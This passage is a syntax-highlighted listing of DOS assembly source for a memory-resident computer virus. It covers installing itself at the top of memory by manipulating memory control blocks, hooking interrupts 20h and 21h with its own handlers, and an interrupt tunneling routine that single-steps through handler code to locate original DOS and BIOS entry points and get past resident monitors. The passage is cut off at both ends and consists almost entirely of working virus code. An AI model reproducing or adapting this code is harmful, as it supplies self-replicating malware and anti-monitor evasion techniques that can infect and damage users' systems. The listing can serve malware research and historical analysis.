         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; ES = segment of PSP for current ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">      </span><span class="sc1">; Free memory</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">       </span><span class="sc1">; BX = number of paragraphs to all...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">      </span><span class="sc1">; Allocate memory</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)*</span><span class="sc2">02h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; ES = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; CX = segment of allocated block</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">      </span><span class="sc1">; Resize memory block</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)*</span><span class="sc2">02h</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">; Store segment of first byte beyo...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; ES = segment of allocated block</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">      </span><span class="sc1">; Resize memory block</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; AX = segment of allocated block</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Decrease AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of Memory Control B...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Multiply by paragraphs</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; DX:AX = segment of Memory Contro...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; BX = low-order word of segment o...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; CX = high-order word of segment ...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Multiply by paragraphs</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; DX:AX = segment of PSP for curre...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Add segment address of next memo...</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Subtract segment of Memory Contr...</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">move_virus</span><span class="sc0">      </span><span class="sc1">; Below? Jump to move_virus</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Store new segment address of nex...</span><span class="sc0">
</span><span class="sc5">move_virus</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">code_begin</span><span class="sc0">   </span><span class="sc1">; SI = offset of code_begin</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move virus to top of memory</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">      </span><span class="sc1">; Get current PSP address</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Decrease BX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; DS = segment of Memory Control B...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (AX)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; AX = segment of allocated block</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Subtract ten from segment of all...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of allocated block ...</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int20_virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">; Set interrupt vector 20h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">; Set interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">tunneler</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 13h/interrupt 21h tunn...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; BX = code segment</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Not equal to data- or extra seg...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_zero_seg</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_zero_seg</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">code_seg_tst</span><span class="sc0">
</span><span class="sc5">tst_zero_seg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Not equal to data- or extra seg...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">test_cs_seg</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to test_cs_seg</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">zero_seg_tst</span><span class="sc0">
</span><span class="sc5">test_cs_seg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
</span><span class="sc5">test_cs_seg_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">0f000h</span><span class="sc0">     </span><span class="sc1">; Segment of tunneled interrupt?</span><span class="sc0">
</span><span class="sc5">tunnel_seg</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">  </span><span class="sc1">; Segment of tunneled interrupt</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_opcode</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to test_opcode</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ES:AX = pointer to interrupt</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_addr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">1111111011111111b</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tunnel_exit_</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">test_opcode</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS:SI = pointer to interrupt</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Save SI at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = data segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; SI = code segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Code segment equal to data segment?</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tunnel_exit</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to tunnel_exit</span><span class="sc0">

         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = opcode of interrupt</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9dh</span><span class="sc0">      </span><span class="sc1">; POPF (opcode 9dh)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_pushf</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to test_pushf</span><span class="sc0">

         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">0000000100000000b</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tunnel_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">test_pushf</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9ch</span><span class="sc0">      </span><span class="sc1">; PUSHF (opcode 9ch)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_iret</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to test_iret</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pushf_simula</span><span class="sc0">
</span><span class="sc5">test_iret</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc0">         </span><span class="sc1">; IRET (opcode 0cfh)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_dec_sp</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to test_dec_sp</span><span class="sc0">

         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">0000000100000000b</span><span class="sc0">
</span><span class="sc5">tunnel_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">
</span><span class="sc5">tunnel_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">test_dec_sp</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">      </span><span class="sc1">; DEC SP (opcode 4ch)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_int</span><span class="sc0">        </span><span class="sc1">; Not equal? Jump to test_int</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = instruction pointer of inte...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store instruction pointer of int...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Save DI at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">          </span><span class="sc1">; Save SS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (SS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; SI = stack pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; DI = stack pointer</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; DI = offset of end of stack</span><span class="sc0">
</span><span class="sc5">move_stack</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AL = word of stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store word of stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; End of stack?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">move_stack</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to move_stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01000011b</span><span class="sc0">    </span><span class="sc1">; AL = low-order byte of flags</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">07h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Store low-order byte of flags</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">          </span><span class="sc1">; Decrease SP</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Load DI from stack</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_cs_seg_</span><span class="sc0">
</span><span class="sc5">test_int</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">command_inst</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tunnel_exit</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to tunnel_exit</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">         </span><span class="sc1">; INT? (opcode 0cdh)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_int03</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to test_int03</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; SI = instruction pointer of inte...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Increase SI</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Increase SI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">     </span><span class="sc1">; Store instruction pointer of int...</span><span class="sc0">
</span><span class="sc5">int_simulati</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; AL = interrupt number</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; Zero AH</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Calculate offset of interrupt ve...</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">;     "       "    "      "       "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SI = offset of interrupt vector</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
